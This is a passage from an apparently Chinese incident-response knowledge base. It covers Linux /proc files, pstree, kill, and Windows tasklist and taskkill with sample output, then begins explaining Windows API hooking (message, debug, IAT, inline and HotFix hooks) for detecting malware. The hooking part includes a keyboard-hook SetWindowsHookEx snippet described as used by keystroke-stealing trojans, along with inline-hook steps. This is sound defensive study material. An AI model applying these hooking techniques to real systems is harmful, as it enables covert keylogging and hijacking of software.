pool，而/proc/slabinfo文件列出了这些对象相关slap的信息；详情可以参见内核文档中slapinfo的手册页；\nparallels@ubuntu:~/Documents$ sudo cat /proc/slabinfo slabinfo - version: 2.1 # name \u003cactive_objs\u003e \u003cnum_objs\u003e \u003cobjsize\u003e \u003cobjperslab\u003e \u003cpagesperslab\u003e : tunables \u003climit\u003e \u003cbatchcount\u003e \u003csharedfactor\u003e : slabdata \u003cactive_slabs\u003e \u003cnum_slabs\u003e \u003csharedavail\u003e ext4_groupinfo_4k 532 532 144 28 1 : tunables 0 0 0 : slabdata 19 19 0 fsverity_info 0 0 256 32 2 : tunables 0 0 0 : slabdata 0 0 0 MPTCPv6 0 0 1856 17 8 : tunables 0 0 0 : slabdata 0 0 0 ip6-frags 0 0 184 44 2 : tunables 0 0 0 : slabdata 0 0 0 PINGv6 0 0 1216 26 8 : tunables 0 0 0 : slabdata 0 0 0 RAWv6 338 338 1216 26 8 : tunables 0 0 0 : slabdata 13 13 0 ....../stat stat — 实时追踪自系统上次启动以来的多种统计信息；如下所示，其中，\n“cpu”行后的八个值分别表示以1/100（jiffies）秒为单位的统计值（包括系统运行于用户模式、低优先级用户模式，运系统模式、空闲模式、I/O等待模式的时间等）；\n“intr”行给出中断的信息，第一个为自系统启动以来，发生的所有的中断的次数；然后每个数对应一个特定的中断自系统启动以来所发生的次数；\n“ctxt”给出了自系统启动以来CPU发生的上下文交换的次数。\n“btime”给出了从系统启动到现在为止的时间，单位为秒；\n“processes (total_forks) 自系统启动以来所创建的任务的个数目；\n“procs_running”：当前运行队列的任务的数目；\n“procs_blocked”：当前被阻塞的任务的数目；\nparallels@ubuntu:~/Documents$ sudo cat /proc/stat cpu 2567490 1440 51293 4222742 573 0 570 0 0 0 cpu0 1517356 706 23050 1852688 351 0 237 0 0 0 cpu1 1050133 734 28242 2370053 221 0 332 0 0 0 intr 10703208 5 3393 0 0 0 0 0 0 1 72225 0 0 144 0 0 0 0 0 14598 221 0 0 0 0 0 28244 28 7018 10447 43 61479 32574 13193 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 ctxt 18957381 btime 1622582403 processes 127489 procs_running 3 procs_blocked 0 softirq 11692393 15 7686922 29 18488 60735 0 3220 2072535 0 1850449/swaps swaps — 当前系统上的交换分区及其空间利用信息，如果有多个交换分区的话，则会每个交换分区的信息分别存储于/proc/swap目录中的单独文件中，而其优先级数字越低，被使用到的可能性越大；下面是作者系统中只有一个交换分区时的输出信息；\nparallels@ubuntu:~/Documents$ cat /proc/swaps Filename Type Size Used Priority /swapfile file 2097148 0 -2/uptime uptime — 系统上次启动以来的运行时间，如下所示，其第一个数字表示系统运行时间，第二个数字表示系统空闲时间，单位是秒；\nparallels@ubuntu:~/Documents$ cat /proc/uptime 42519.81 50173.72/version（重点） version — 当前系统运行的内核版本号，在作者的RHEL5.3上还会显示系统安装的gcc版本，如下所示；\nparallels@ubuntu:~/Documents$ cat /proc/version Linux version 5.8.0-53-generic (buildd@lcy01-amd64-012) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #60~20.04.1-Ubuntu SMP Thu May 6 09:52:46 UTC 2021/vmstat vmstat — 当前系统虚拟内存的多种统计数据，信息量可能会比较大，这因系统而有所不同，可读性较好；下面为作者机器上输出信息的一个片段；（2.6以后的内核支持此文件）\nparallels@ubuntu:~/Documents$ cat /proc/vmstat nr_free_pages 405201 nr_zone_inactive_anon 615 nr_zone_active_anon 228524 nr_zone_inactive_file 119513 nr_zone_active_file 177357 nr_zone_unevictable 0 nr_zone_write_pending 10 nr_mlock 0 nr_page_table_pages 4200 nr_kernel_stack 10048 nr_bounce 0 nr_zspages 0 nr_free_cma 0 numa_hit 21836396 numa_miss 0 numa_foreign 0 ....../zoneinfo zoneinfo — 内存区域（zone）的详细信息列表，信息量较大，下面列出的是一个输出片段：\nparallels@ubuntu:~/Documents$ cat /proc/zoneinfo Node 0, zone DMA per-node stats nr_inactive_anon 615 nr_active_anon 228553 nr_inactive_file 119513 nr_active_file 177369 nr_unevictable 0 nr_slab_reclaimable 25998 nr_slab_unreclaimable 26446 nr_isolated_anon 0 nr_isolated_file 0 workingset_nodes 0 workingset_refault 0 workingset_activate 0 workingset_restore 0 workingset_nodereclaim 0 nr_anon_pages 228265 nr_mapped 61375 nr_file_pages 297792 nr_dirty 11 nr_writeback 0 nr_writeback_temp 0 nr_shmem 911 nr_shmem_hugepages 0 nr_shmem_pmdmapped 0 nr_file_hugepages 0 nr_file_pmdmapped 0 nr_anon_transparent_hugepages 0 nr_vmscan_write 0 nr_vmscan_immediate_reclaim 0 nr_dirtied 420987 nr_written 277592 nr_kernel_misc_reclaimable 0 nr_foll_pin_acquired 0 nr_foll_pin_released 0 pages free 3845 min 67 low 83 high 99 spanned 4095 present 3998 managed 3977 protection: (0, 2652, 3855, 3855, 3855) ....../sys sys — 目录详解\n与/proc下其它文件的“只读”属性不同的是，管理员可对/proc/sys子目录中的许多文件内容进行修改以更改内核的运行特性，事先可以使用“ls -l”命令查看某文件是否“可写入”。写入操作通常使用类似于“echo DATA \u003e /path/to/your/filename”的格式进行。需要注意的是，即使文件可写，其一般也不可以使用编辑器进行编辑。\nparallels@ubuntu:~/Documents$ ll /proc/sys total 0 dr-xr-xr-x 1 root root 0 Jun 1 23:29 ./ dr-xr-xr-x 309 root root 0 Jun 1 23:29 ../ dr-xr-xr-x 1 root root 0 Jun 2 17:17 abi/ dr-xr-xr-x 1 root root 0 Jun 2 17:17 debug/ dr-xr-xr-x 1 root root 0 Jun 1 23:29 dev/ dr-xr-xr-x 1 root root 0 Jun 1 23:29 fs/ dr-xr-xr-x 1 root root 0 Jun 1 23:29 kernel/ dr-xr-xr-x 1 root root 0 Jun 1 23:29 net/ dr-xr-xr-x 1 root root 0 Jun 2 17:17 user/ dr-xr-xr-x 1 root root 0 Jun 1 23:29 vm//proc/sys/debug 子目录\n此目录通常是一空目录；\n/proc/sys/dev 子目录\n为系统上特殊设备提供参数信息文件的目录，其不同设备的信息文件分别存储于不同的子目录中，如大多数系统上都会具有的/proc/sys/dev/cdrom和/proc/sys/dev/raid（如果内核编译时开启了支持raid的功能） 目录，其内存储的通常是系统上cdrom和raid的相关参数信息文件。\npstree（比较好用） 相较于/proc查询，pstree的展示更加方便，比ps展示的更加清晰有层次\npstree [-a] [-c] [-h|-Hpid] [-l] [-n] [-p] [-u] [-G|-U] [pid|user] -a 显示该行程的完整指令及参数, 如果是被记忆体置换出去的行程则会加上括号 -c 如果有重覆的行程名, 则分开列出（预设值是会在前面加上 *） -A 各进程树之间的连接以ASCII码字符来连接 -U 各进程树之间的连接以utf8字符来连接，某些终端可能会有错误 -p 同时列出每个进程的PID -u 同时列出每个进程的所属账号名称(被小括号括起来) 特别表明在运行的进程 # pstree -apnh //显示进程间的关系 同时显示用户名称 # pstree -u //显示用户名称这里也同样使用多线程程序测试，可以看到pstree展示多线程情况如下\nparallels@ubuntu:~/Documents$ pstree -anph 150666 python3,150666 pymutil.py |-{python3},150667 `-{python3},150668kill (结束进程） kill -9 PID 强制关闭某进程\nkill PID 关闭某进程\nwindows下系统进程查询 tasklist C:\\Users\\xt\u003etasklist /? TASKLIST [/S system [/U username [/P [password]]]] [/M [module] | /SVC | /V] [/FI filter] [/FO format] [/NH] 描述: 该工具显示在本地或远程机器上当前运行的进程列表。 参数列表: /S system 指定连接到的远程系统。（需要远端开启RPC服务，否则无法连接） /U [domain\\]user 指定应该在哪个用户上下文执行这个命令。 /P [password] 为提供的用户上下文指定密码。如果省略，则 提示输入。 /M [module] 列出当前使用所给 exe/dll 名称的所有任务。 如果没有指定模块名称，显示所有加载的模块。 /SVC 显示每个进程中主持的服务。 /APPS 显示 Microsoft Store 应用及其关联的进程。 /V 显示详细任务信息。 /FI filter 显示一系列符合筛选器 指定条件的任务。 /FO format 指定输出格式。 有效值: \"TABLE\"、\"LIST\"、\"CSV\"。 /NH 指定列标题不应该 在输出中显示。 只对 \"TABLE\" 和 \"CSV\" 格式有效。 /? 显示此帮助消息。 筛选器: 筛选器名称 有效运算符 有效值 ----------- --------------- -------------------------- STATUS eq, ne RUNNING | SUSPENDED NOT RESPONDING | UNKNOWN IMAGENAME eq, ne 映像名称 PID eq, ne, gt, lt, ge, le PID 值 SESSION eq, ne, gt, lt, ge, le 会话编号 SESSIONNAME eq, ne 会话名称 CPUTIME eq, ne, gt, lt, ge, le CPU 时间，格式为 hh:mm:ss。 hh - 小时， mm - 分钟，ss - 秒 MEMUSAGE eq, ne, gt, lt, ge, le 内存使用(以 KB 为单位) USERNAME eq, ne 用户名，格式为 [域\\]用户 SERVICES eq, ne 服务名称 WINDOWTITLE eq, ne 窗口标题 模块 eq, ne DLL 名称 注意: 当查询远程计算机时，不支持 \"WINDOWTITLE\" 和 \"STATUS\" 筛选器。 Examples: TASKLIST TASKLIST /M dll文件名（不加则导出所有程序及其使用的dll，量很大） 列出所有使用或调用指定dll文件的程序 TASKLIST /V /FO CSV 用csv格式输出所有程序详情 TASKLIST /SVC /FO LIST 用list格式输出所有程序的服务 TASKLIST /APPS /FI \"STATUS eq RUNNING\" 显示所有微软商店相关并且状态为正在运行中的程序 TASKLIST /M wbem* 显示所有调用wbem开头的dll模块的程序 TASKLIST /S IP /FO LIST TASKLIST /S IP /U 域\\用户名 /FO CSV /NH TASKLIST /S IP /U username /P password /FO TABLE /NH TASKLIST /FI \"USERNAME ne NT AUTHORITY\\SYSTEM\" /FI \"STATUS eq running\" 系统中正在运行的非“SYSTEM“的所有进程 TASKLIST /M user32.dll 显示所有使用user32.dll的程序C:\\Users\\xt\u003etasklist 映像名称 PID 会话名 会话# 内存使用 ========================= ======== ================ =========== ============ System Idle Process 0 Services 0 8 K System 4 Services 0 32 K Registry 92 Services 0 60,240 K smss.exe 336 Services 0 532 K csrss.exe 464 Services 0 3,664 K wininit.exe 568 Services 0 3,756 K services.exe 700 Services 0 8,220 K lsass.exe 720 Services 0 13,968 K svchost.exe 836 Services 0 24,472 K fontdrvhost.exe 868 Services 0 860 K WUDFHost.exe 936 Services 0 1,884 K C:\\Users\\xt\u003eTASKLIST /M user32.dll 映像名称 PID 模块 ========================= ======== ============================================ lsass.exe 720 user32.dll svchost.exe 836 USER32.dll WUDFHost.exe 936 USER32.dll svchost.exe 432 USER32.dll svchost.exe 1044 user32.dll svchost.exe 1104 user32.dll svchost.exe 1112 user32.dll svchost.exe 1236 user32.dll svchost.exe 1268 user32.dll C:\\Users\\xt\u003eTASKLIST /V /FO CSV \"映像名称\",\"PID\",\"会话名 \",\"会话# \",\"内存使用 \",\"状态 \",\"用户名 \",\"CPU 时间\",\"窗口标题 \" \"System Idle Process\",\"0\",\"Services\",\"0\",\"8 K\",\"Unknown\",\"NT AUTHORITY\\SYSTEM\",\"2:29:41\",\"暂缺\" \"System\",\"4\",\"Services\",\"0\",\"32 K\",\"Unknown\",\"暂缺\",\"0:20:12\",\"暂缺\" \"Registry\",\"92\",\"Services\",\"0\",\"58,972 K\",\"Unknown\",\"NT AUTHORITY\\SYSTEM\",\"0:00:03\",\"暂缺\" \"smss.exe\",\"336\",\"Services\",\"0\",\"520 K\",\"Unknown\",\"NT AUTHORITY\\SYSTEM\",\"0:00:01\",\"暂缺\" \"csrss.exe\",\"464\",\"Services\",\"0\",\"3,680 K\",\"Unknown\",\"NT AUTHORITY\\SYSTEM\",\"0:00:03\",\"暂缺\" \"wininit.exe\",\"568\",\"Services\",\"0\",\"3,724 K\",\"Unknown\",\"NT AUTHORITY\\SYSTEM\",\"0:00:00\",\"暂缺\" ...... \"svchost.exe\",\"2208\",\"Services\",\"0\",\"31,984 K\",\"Unknown\",\"NT AUTHORITY\\SYSTEM\",\"0:00:01\",\"暂缺\" \"svchost.exe\",\"9488\",\"Services\",\"0\",\"8,204 K\",\"Unknown\",\"NT AUTHORITY\\LOCAL SERVICE\",\"0:00:00\",\"暂缺\" \"svchost.exe\",\"6972\",\"Services\",\"0\",\"11,368 K\",\"Unknown\",\"NT AUTHORITY\\LOCAL SERVICE\",\"0:00:00\",\"暂缺\" \"csrss.exe\",\"1604\",\"Console\",\"2\",\"5,944 K\",\"Running\",\"NT AUTHORITY\\SYSTEM\",\"0:00:01\",\"暂缺\" \"winlogon.exe\",\"6448\",\"Console\",\"2\",\"13,628 K\",\"Unknown\",\"NT AUTHORITY\\SYSTEM\",\"0:00:00\",\"暂缺\" \"dwm.exe\",\"8792\",\"Console\",\"2\",\"139,520 K\",\"Running\",\"Window Manager\\DWM-2\",\"0:00:03\",\"DWM Notification Window\" \"fontdrvhost.exe\",\"9804\",\"Console\",\"2\",\"14,600 K\",\"Unknown\",\"Font Driver Host\\UMFD-2\",\"0:00:00\",\"暂缺\" \"prl_tools.exe\",\"9888\",\"Console\",\"2\",\"11,684 K\",\"Running\",\"NT AUTHORITY\\SYSTEM\",\"0:00:00\",\"暂缺\" \"coherence.exe\",\"2420\",\"Console\",\"2\",\"10,012 K\",\"Unknown\",\"NT AUTHORITY\\SYSTEM\",\"0:00:00\",\"暂缺\" \"coherence.exe\",\"6608\",\"Console\",\"2\",\"6,064 K\",\"Unknown\",\"NT AUTHORITY\\SYSTEM\",\"0:00:00\",\"暂缺\" \"svchost.exe\",\"8428\",\"Services\",\"0\",\"5,876 K\",\"Unknown\",\"NT AUTHORITY\\LOCAL SERVICE\",\"0:00:00\",\"暂缺\" \"ChsIME.exe\",\"3924\",\"Console\",\"2\",\"16,548 K\",\"Unknown\",\"NT AUTHORITY\\SYSTEM\",\"0:00:00\",\"暂缺\" \"SangforUDProtect.exe\",\"5764\",\"Console\",\"2\",\"9,992 K\",\"Running\",\"NT AUTHORITY\\SYSTEM\",\"0:00:00\",\"SangforUDProtectExe\" \"ctfmon.exe\",\"8296\",\"Console\",\"2\",\"31,008 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:02\",\"暂缺\" \"sihost.exe\",\"9076\",\"Console\",\"2\",\"28,724 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:01\",\"暂缺\" \"svchost.exe\",\"7628\",\"Console\",\"2\",\"19,612 K\",\"Unknown\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:00\",\"暂缺\" \"svchost.exe\",\"8956\",\"Console\",\"2\",\"41,044 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:00\",\"Windows Push Notifications Platform\" \"ChsIME.exe\",\"3952\",\"Console\",\"2\",\"8,300 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:00\",\"暂缺\" \"taskhostw.exe\",\"1572\",\"Console\",\"2\",\"10,444 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:00\",\"Task Host Window\" \"explorer.exe\",\"8916\",\"Console\",\"2\",\"159,660 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:01:01\",\"暂缺\" \"svchost.exe\",\"1080\",\"Console\",\"2\",\"22,848 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:00\",\"暂缺\" \"dllhost.exe\",\"9608\",\"Console\",\"2\",\"16,576 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:00\",\"OleMainThreadWndName\" \"StartMenuExperienceHost.exe\",\"3524\",\"Console\",\"2\",\"77,320 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:01\",\"启动\" \"RuntimeBroker.exe\",\"6840\",\"Console\",\"2\",\"26,352 K\",\"Unknown\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:01\",\"暂缺\" \"dllhost.exe\",\"2996\",\"Console\",\"2\",\"7,596 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:01\",\"OleMainThreadWndName\" \"SearchApp.exe\",\"2476\",\"Console\",\"2\",\"164,680 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:06\",\"搜索\" \"RuntimeBroker.exe\",\"7692\",\"Console\",\"2\",\"35,440 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:02\",\"暂缺\" \"wpscloudsvr.exe\",\"928\",\"Console\",\"2\",\"8,724 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:03\",\"暂缺\" \"prl_cc.exe\",\"7980\",\"Console\",\"2\",\"39,768 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:08\",\"暂缺\" \"TextInputHost.exe\",\"5760\",\"Console\",\"2\",\"46,064 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:00\",\"Microsoft Text Input Application\" \"RuntimeBroker.exe\",\"7776\",\"Console\",\"2\",\"19,536 K\",\"Unknown\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:01\",\"暂缺\" \"YourPhone.exe\",\"5524\",\"Console\",\"2\",\"49,812 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:00\",\"暂缺\" \"SecurityHealthSystray.exe\",\"10668\",\"Console\",\"2\",\"9,600 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:00\",\"暂缺\" \"HipsTray.exe\",\"10768\",\"Console\",\"2\",\"26,300 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:01\",\"暂缺\" \"vm3dservice.exe\",\"10884\",\"Console\",\"2\",\"6,860 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:00\",\"VM3DService Hidden window\" \"FileOpenBroker64.exe\",\"10932\",\"Console\",\"2\",\"8,716 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:00\",\"FileOpenBroker64.exe\" \"AdobeARM.exe\",\"11036\",\"Console\",\"2\",\"23,352 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:00\",\"Adobe Reader Updater\" \"WmiPrvSE.exe\",\"11184\",\"Services\",\"0\",\"9,044 K\",\"Unknown\",\"NT AUTHORITY\\SYSTEM\",\"0:00:00\",\"暂缺\" \"cmd.exe\",\"10912\",\"Console\",\"2\",\"4,688 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:00\",\"管理员: C:\\WINDOWS\\system32\\cmd.exe - TASKLIST /V /FO CSV\" \"conhost.exe\",\"2664\",\"Console\",\"2\",\"17,868 K\",\"Running\",\"DESKTOP-D9ITQNU\\xt\",\"0:00:05\",\"暂缺\" C:\\Users\\xt\u003eTASKLIST /SVC /FO LIST 映像名称: System Idle Process PID: 0 服务 : 暂缺 映像名称: System PID: 4 服务 : 暂缺 映像名称: Registry PID: 92 服务 : 暂缺 ...... 映像名称: lsass.exe PID: 720 服务 : KeyIso SamSs VaultSvc 映像名称: svchost.exe PID: 836 服务 : BrokerInfrastructure DcomLaunch PlugPlay Power SystemEventsBroker 映像名称: fontdrvhost.exe PID: 868 服务 : 暂缺 映像名称: WUDFHost.exe PID: 936 服务 : 暂缺 ...... C:\\Users\\xt\u003eTASKLIST /M wbem* 映像名称 PID 模块 ========================= ======== ============================================ svchost.exe 3040 wbemcomn.dll, wbemcore.dll, wbemsvc.dll, wbemess.dll WmiPrvSE.exe 5356 wbemcomn.dll, wbemsvc.dll WmiPrvSE.exe 11184 wbemcomn.dll, wbemsvc.dll svchost.exe 6408 wbemprox.dll, wbemcomn.dll, wbemsvc.dll tasklist.exe 1896 wbemprox.dll, wbemcomn.dll, wbemsvc.dlltaskkill （结束进程） 查杀进程\ntaskkill /pid 1132（PID）\ntaskkill /IM notepad.exe（进程名）\n",
    "description": "",
    "tags": null,
    "title": "系统进程检查",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B%E6%A3%80%E6%9F%A5/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "组策略",
    "uri": "/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/index.html"
  },
  {
    "content": "Hook分为应用层（Ring3）Hook和内核层（Ring0）Hook，应用层Hook适用于x86和x64，而内核层Hook一般仅在x86平台适用，因为从Windows Vista的64版本开始引入的Patch Guard技术极大地限制了Windows x64内核挂钩的使用。\nwindows下应用层和内核钩子检查 hook hook原理部分 HOOK和注入技术经常被恶意代码使用,利用HOOK和注入技术,恶意代码提高了执行隐蔽性,增加了恶意代码分析难度，在某些情况下还能实现提权提升和内存常驻。\n钩子(Hook)，是Windows消息处理机制的一个平台,应用程序可以在上面设置子程以监视指定窗口的某种消息，而且所监听的窗口可以是其他进程所创建的。当消息到达后,在目标窗口处理函数之前处理它，钩子机制允许应用程序截获处理Window消息或特定事件。\nhook的分类 Hook分为应用层（Ring3）Hook和内核层（Ring0）Hook，应用层Hook适用于x86和x64，而内核层Hook一般仅在x86平台适用，因为从Windows Vista的64版本开始引入的Patch Guard技术极大地限制了Windows x64内核挂钩的使用。\n消息hook 首先先来了解下常规的Windows消息流：\n发生键盘输入事件时，WM_KEYDOWN消息被添加到[OS message queue]系统消息队列。\nOS判断哪个应用程序中发生了事件，然后从[OS message queue]系统消息队列中取出消息，添加到相应应用程序的[application message queue]应用消息队列中。\n应用程序（如记事本）监视自身的[application message queue]应用消息队列，发现新添加的WM_KEYDOWN消息后，调用相应的事件处理程序处理。\n所以，我们只需在[OS message queue]和[application message queue]之间安装钩子即可窃取键盘消息，并实现恶意操作。\n那么我们该如何安装这个消息钩子呢？很简单，Windows提供了一个官方函数SetWindowsHookEx()用于设置消息Hook，编程时只要调用该API就能简单地实现Hook。\n消息Hook常被窃密木马用来监听用户的键盘输入，程序里只需写入如下代码就能对键盘消息进行Hook:\nSetWindowsHookEx(\nWH_KEYBOARD, //键盘消息\nKeyboardProc, //钩子函数（处理键盘输入的函数）\nhInstance, //钩子函数所在DLL的Handle\n0 //该参数用于设定要Hook的线程ID，为0时表示监视所有线程\n)\n该API在简单高效的同时也有一个弊端，就是它只能监视较少的消息，如：击键消息、鼠标移动消息、窗口消息。想要对系统更全面的进行Hook就要使用以下介绍的两种Hook方法。\n调试hook 调试hook原理 该Hook方法的原理跟调试器的工作机制相似，核心思想都是让进程发生异常，然后自己捕获到该异常，对处于被调试状态下的级才能进行恶意操作。 下图是常规进程的异常事件处理，当进程未被其他进程调试时，其默认异常事件处理者是OS，一旦进程发生异常，OS将捕获到该异常，并进行相应的事件处理。\n若进程被另一个进程调试了（如OllyDbg），异常事件的处理工作将移交给调试者，比如进程发生了除0错误，OllyDbg将接收到这个异常事件并对进行相应处理。 PS：调试器无处理或不关心的调试事件最终由OS处理。\n所以，调试Hook的核心思路就是将API的第一个字节修改为0xCC（INT 3），当API被调用时，由于触发了异常，控制权就被转交给调试器。\n注入hook Hook的核心思想就是修改API的代码，但是，比如我A进程要Hook一个B进程的CreateProcess函数，A是没有权限修改B内存中的代码的，怎么办？这时候使用DLL注入技术就可以解决这问题，我们将Hook的代码写入一个DLL（或直接一个shellcode），将此DLL注入到B进程中，此时因为DLL在B进程的内存中，所以就有权限直接修改B内存中的代码了。\n[\n](https://blog.csdn.net/m0_37552052/article/details/81453591)\nIAT hook**（ring3 windows消息型）** IAT（导入地址表） Import Address Table 由于导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个DLL 中.当PE 文件被装入内存的时候，Windows 装载器才将DLL 装入，并将调用导入函数的指令和函数实际所处的地址联系起来(动态连接)，这操作就需要导入表完成。其中导入地址表就指示函数实际地址。\nIAT hook IAT Hook顾名思义就是通过修改IAT里的函数地址对API进行Hook。\nIAT hook技术原理 如下，左图红框内是IAT修改前的状态，指明SetWindowTextW()的地址为0x77D0960E，所以calc.exe执行call SetWindowTextW（dword ptr[01001110]）实质上就是执行call 0x77D0960E。\n右图是被Hook后的状态，IAT中的SetWinowTextW()的地址已被修改为0x10001000，calc.exe执行call SetWindowTextW（dword ptr[01001110]）实质变成了执行call 0x10001000（也就是恶意代码的起始地址），这时候就可以做我们想做的操作了。\ninline hook**（ring3 windows api型）** 内联Hook相比于IAT Hook，显得更简单粗暴，它直接修改内存中任意函数的代码，将其劫持至Hook API。同时，它比IAT Hook的适用范围更广，因为只要是内存中有的函数它都能Hook，而后者只能Hook IAT表里存在的函数（有些程序会动态加载函数）。\ninline hook技术原理 Inline Hook的目标是系统函数，如下，左图是Hook之前的状态，procexp.exe进程调用ZwQuerySystemInformation()函数时，ZwQuerySystemInformation()的代码是正常的代码。右图是Hook后的状态，注意红框中的代码，ZwQuerySystemInformation()函数开头5个字节已被修改，变成了jmp 0x10001120，也就是我们恶意代码的地址，之后便可以开始我们的自定义操作。0x1000116A我们先进行unhook操作（脱钩），目的是将ZwQuerySystemInformation()的代码恢复。大家可能有疑惑，为什么刚修改完又要恢复回来，原因很简单，Hook的目的是当调用某个函数时，我们能劫持进程的执行流。现在我们已经劫持了进程的执行流，便可以恢复ZwQuerySystemInformation()的代码，以便我们的恶意代码可以正常调用ZwQuerySystemInformation()。执行完恶意代码后，再次挂钩，监控该函数。\n[\n](https://blog.csdn.net/m0_37552052/article/details/81453591)\n首先获取原API的地址，并保存在pfnOrg中，然后修改内存段属性为RWX，备份原有代码（以便后续代码恢复），实时计算JMP的相对偏移，最后修改API前5字节的代码，恢复内存属性。\nHotFix Hook（ring3 windows api型） 从上节对Code Hook方法的讲解中，我们会发现Code Hook存在一个效率的问题，因为每次Code Hook都要进行“挂钩+脱钩”的操作，也就是要对API的前5字节修改两次，这样，当我们要进行全局Hook的时候，系统运行效率会受影响。而且，当一个线程尝试运行某段代码时，若另一个线程正在对该段代码进行“写”操作，这时就会程序冲突，最终引发一些错误。\n有没有办法避免这种隐患呢？答案是有的，可以使用HotFix Hook（“热补丁”）方法。\nHotFix Hook技术原理 以上累出的API起始代码有如下两个明显的相似点： \\1. API代码以“MOV EDI,EDI”指令开始。 \\2. API代码上方有5个NOP指令。\nMOV EDI,EDI用于将EDI的值再次复制给EDI，这没有什么实际意义。也就是说，API起始代码的MOV指令（2个字节）与其上方的5个NOP指令（5个字节）合起来共7个字节的指令没有任何意义。所以我们就可以通过修改这7个字节来实现Hook操作。这种方法因为可以在进程处于运行状态时临时更改进程内存中的库文件，所以微软也常用这种方法来打“热补丁”。\n如下，将前7个字节改成： JMP 10001000（恶意代码地址） JMP SHORT 0x7C802366\n这样，当API被调用时，首先执行了JMP SHORT 0x7C802366，便跳到了JMP 10001000处执行，最后跳到了恶意代码的起始处0x10001000。\n在5字节代码修改技术中“脱钩”是为了“调用原函数”，而使用“热补丁”技术钩取API时，在API代码遭到修改的状态下也能正常调用原API（从[API起始地址+2]地址开始，仍然能正常调用原API，且执行的动作也完全一样）。\n由于HotFix Hook需要修改7个字节的代码，所以并不是所有API都适用这种方法，若不适用，请使用5字节代码修改技术。\nssdt hook（ring0） 